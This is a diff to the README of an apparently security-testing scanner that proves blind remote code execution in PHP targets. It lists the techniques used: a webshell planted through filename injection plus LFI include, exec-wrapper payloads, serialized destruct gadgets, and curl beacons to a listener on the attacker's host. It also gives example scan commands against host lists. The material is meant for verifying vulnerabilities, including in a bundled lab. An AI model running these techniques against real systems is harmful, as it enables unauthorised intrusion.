@@ -234,19 +234,20 @@ Notes:
 ## Blind scanner (`scan_blind.py`)
 
 Proves RCE even when the target returns **no output**: the payload makes the
-target run `curl <attacker-ip>:8000` against a listener the script opens
-(`0.0.0.0:8000`), and any inbound connection is positive proof. Every
-attempt carries a unique beacon path (`curl <ip>:8000/<tag>`), so a beacon
-identifies *exactly which technique* fired; one literal bare
-`curl <ip>:8000` attempt per chain is peer-IP-attributed. The listener
+target run **your** beacon command against a listener the script opens
+(`0.0.0.0:8000`), and any inbound connection is positive proof. `--beacon`
+is **required** — there is no built-in beacon. The placeholders
+`<IP_ADDRESS>` (or `<IP>`), `<PORT>` and `<TAG>` are substituted per attempt:
+with `<TAG>` every connection is attributable to the exact technique;
+without it, attempts are attributed by timing window + peer IP. The listener
 replies `BEACON-OK`, so when the execution channel *does* return output the
 beacon is double-confirmed in the response body.
 
 ```bash
-uv run scan_blind.py --hosts hosts.txt
-uv run scan_blind.py http://127.0.0.1:18081 --docker p2s2-lab
-uv run scan_blind.py 10.0.0.5:80 --ip 10.0.0.1 --listen-port 8000
 uv run scan_blind.py --hosts hosts.txt --beacon 'curl <IP_ADDRESS>:8000'
+uv run scan_blind.py http://127.0.0.1:18081 --docker p2s2-lab --beacon 'curl <IP_ADDRESS>:8000'
+uv run scan_blind.py 10.0.0.5:80 --ip 10.0.0.1 --beacon 'curl <IP_ADDRESS>:8000'
+uv run scan_blind.py --hosts hosts.txt --beacon 'curl <IP_ADDRESS>:8000/<TAG>'   # per-technique attribution
 ```
 
 Techniques tried per target (the full matrix):
@@ -256,7 +257,7 @@ Techniques tried per target (the full matrix):
 | A1 | A | webshell via filename injection (`system($_GET['c'])`) + LFI include; write and LFI endpoints auto-probed unless given | marker, then blind beacons |
 | A2 | A | one-shot payloads: 6 exec wrappers (`system`, `passthru`, `shell_exec`, `exec`, `popen`, backticks) x 2 vectors (filename, progress value), each with its own beacon — runs when `--a-lfi-path` is known but the webshell marker is absent | blind beacons |
 | C1 | C | serialized destruct gadget, marker via `==PROOF==` echo / `--docker` | marker |
-| C2/C3 | C | gadget cmd = `curl <ip>:8000` (bare + tagged) | blind beacons |
+| C2/C3 | C | blind beacon through the gadget (untagged + tagged) | blind beacons |
 
 Verification ladder: verifiable marker -> blind beacon -> preconditions
 (fixation / handler mismatch) -> `PATCHED?` (fresh Set-Cookie oracle).
@@ -276,12 +277,12 @@ Networking notes:
   Note that beacons do NOT go through the proxy: the target connects to the
   listener directly, so the address in `--beacon` must be reachable from the
   target (set `--ip` to the same address).
-- **custom beacons**: `--beacon 'curl <IP_ADDRESS>:8000'` replaces the
-  built-in `curl||wget`+tags command with your own; the placeholders
-  `<IP_ADDRESS>` (or `<IP>`), `<PORT>` and `<TAG>` are substituted. Without
-  a `<TAG>` placeholder, attempts are attributed by timing window + peer IP
-  instead of a unique beacon path. Quote-free beacons keep the filename
-  injection vector usable (the scanner warns otherwise).
+- **custom beacons**: `--beacon` is required (no built-in default).
+  The placeholders `<IP_ADDRESS>` (or `<IP>`), `<PORT>` and `<TAG>` are
+  substituted. Without a `<TAG>` placeholder, attempts are attributed by
+  timing window + peer IP instead of a unique beacon path. Quote-free
+  beacons keep the filename injection vector usable (the scanner warns
+  otherwise).
 - scanning the bundled lab (or any docker target on this host): the target
   container's loopback is *its own* — the scanner auto-detects the
   `docker0` bridge IP (`172.17.0.1`) and beacons arrive from the container
